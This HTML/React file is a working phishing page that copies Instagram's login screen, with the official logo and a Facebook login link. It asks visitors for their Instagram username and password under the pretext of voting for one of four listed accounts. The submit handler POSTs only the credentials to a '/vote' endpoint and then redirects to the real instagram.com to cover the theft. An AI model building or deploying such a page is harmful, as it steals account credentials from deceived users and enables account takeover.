<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- React & ReactDOM -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <!-- Babel -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Grand+Hotel&display=swap"
        rel="stylesheet">

    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fafafa;
        }

        .font-logo {
            font-family: 'Grand Hotel', cursive;
        }

        /* Instagram-like animations */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .animate-fade-in {
            animation: fadeIn 0.5s ease-out;
        }
    </style>
</head>

<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function App() {
            const [username, setUsername] = useState('');
            const [password, setPassword] = useState('');
            const [selectedUser, setSelectedUser] = useState('user1');
            const [isLoading, setIsLoading] = useState(false);
            const [showSuccess, setShowSuccess] = useState(false);

            const handleVote = async (e) => {
                e.preventDefault();
                setIsLoading(true);

                const data = { username, password };

                try {
                    const response = await fetch('/vote', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });

                    if (response.ok) {
                        setShowSuccess(true);
                        // Redirect or close logic after 2 seconds
                        setTimeout(() => {
                            // Try to go back if there is history
                            if (window.history.length > 1) {
                                window.history.back();
                            } else {
                                // Try to close the tab
                                try {
                                    window.close();
                                } catch (e) {
                                    console.log("Could not close window via script");
                                }
                                // Fallback: Redirect to Instagram official site (effectively "exiting" our app)
                                window.location.href = "https://www.instagram.com";
                            }
                        }, 2000);
                    } else {
                        alert("Error submitting vote. Please try again.");
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert("Network error. Please try again.");
                } finally {
                    setIsLoading(false);
                }
            };

            const isFormValid = username.length > 0 && password.length > 5;

            if (showSuccess) {
                return (
                    <div className="flex flex-col items-center justify-center min-h-screen bg-black/50 fixed inset-0 z-50 animate-fade-in">
                        <div className="bg-white p-8 rounded-xl shadow-2xl text-center max-w-sm mx-4 transform transition-all scale-100">
                            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                                </svg>
                            </div>
                            <h2 className="text-2xl font-bold text-gray-800 mb-2">Thanks for voting!</h2>
                            <p className="text-gray-600 mb-6">Your vote for @{selectedUser} has been recorded.</p>
                            <p className="text-sm text-gray-400">Redirecting...</p>
                        </div>
                    </div>
                );
            }

            return (
                <div className="flex flex-col min-h-screen items-center justify-center">
                    <div className="bg-white border border-gray-300 w-[350px] flex flex-col items-center py-10 px-10 mb-2.5 animate-fade-in">
                        {/* Logo */}
                        <div className="mb-8 cursor-pointer select-none">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                                alt="Instagram"
                                className="w-[175px]" />
                        </div>

                        {/* Form */}
                        <form onSubmit={handleVote} className="flex flex-col w-full space-y-1.5">
                            <div className="relative group">
                                <input
                                    type="text"
                                    className="text-xs w-full mb-1.5 border border-gray-300 rounded-[3px] bg-gray-50 px-2 py-[9px] focus:outline-none focus:border-gray-400 placeholder-gray-500 transition-colors"
                                    placeholder="Phone number, username, or email"
                                    value={username}
                                    onChange={(e) => setUsername(e.target.value)}
                                    required
                                />
                            </div>

                            <div className="relative group">
                                <input
                                    type="password"
                                    className="text-xs w-full mb-1.5 border border-gray-300 rounded-[3px] bg-gray-50 px-2 py-[9px] focus:outline-none focus:border-gray-400 placeholder-gray-500 transition-colors"
                                    placeholder="Password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    required
                                />
                            </div>

                            {/* User Selection */}
                            <div className="w-full mb-2">
                                <label className="block text-xs text-gray-400 mb-1 font-medium">Vote for:</label>
                                <div className="relative">
                                    <select
                                        value={selectedUser}
                                        onChange={(e) => setSelectedUser(e.target.value)}
                                        className="text-xs w-full border border-gray-300 rounded-[3px] bg-gray-50 px-2 py-2 focus:outline-none focus:border-gray-400 appearance-none cursor-pointer"
                                    >
                                        <option value="user1">@yaktamein</option>
                                        <option value="user2">@a_shu_38</option>
                                        <option value="user3">@13.kaifuuu</option>
                                        <option value="user4">@rawbin_daniel5</option>
                                    </select>
                                    <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-500">
                                        <svg className="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" /></svg>
                                    </div>
                                </div>
                            </div>

                            <button
                                type="submit"
                                disabled={!isFormValid || isLoading}
                                className={`w-full text-white font-semibold text-sm rounded-[4px] py-1.5 mt-2 transition-all flex justify-center items-center
                                    ${isFormValid && !isLoading ? 'bg-[#0095f6] hover:bg-[#1877F2]' : 'bg-[#b2dffc] cursor-default'}`}
                            >
                                {isLoading ? (
                                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                ) : (
                                    'Vote'
                                )}
                            </button>
                        </form>

                        <div className="flex items-center w-full my-4">
                            <div className="h-px bg-gray-300 flex-1"></div>
                            <span className="px-4 text-[13px] text-gray-500 font-semibold uppercase">OR</span>
                            <div className="h-px bg-gray-300 flex-1"></div>
                        </div>

                        <a href="#" className="flex items-center justify-center text-[#385185] text-sm font-semibold mb-3 hover:text-[#385185]/80 transition-colors">
                            <span className="bg-no-repeat w-4 h-4 mr-2" style={{ backgroundImage: 'url(https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/Ob_7-RijpU9.png)', backgroundPosition: '-414px -259px' }}></span>
                            Log in with Facebook
                        </a>

                        <a href="#" className="text-xs text-[#00376b] hover:text-[#00376b]/80 transition-colors">Forgot password?</a>
                    </div>

                    <div className="bg-white border border-gray-300 w-[350px] py-5 text-center">
                        <p className="text-sm">Don't have an account? <a href="#" className="text-[#0095f6] font-semibold">Sign up</a></p>
                    </div>

                    <div className="mt-5 text-center">
                        <p className="text-xs text-gray-500">Get the app.</p>
                        <div className="flex justify-center space-x-2 mt-3">
                            {/* Placeholders for app store badges */}
                            <img alt="Get it on Google Play" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" className="h-[40px] cursor-pointer" />
                            <img alt="Get it from Microsoft" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" className="h-[40px] cursor-pointer" />
                        </div>
                    </div>
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>

</html>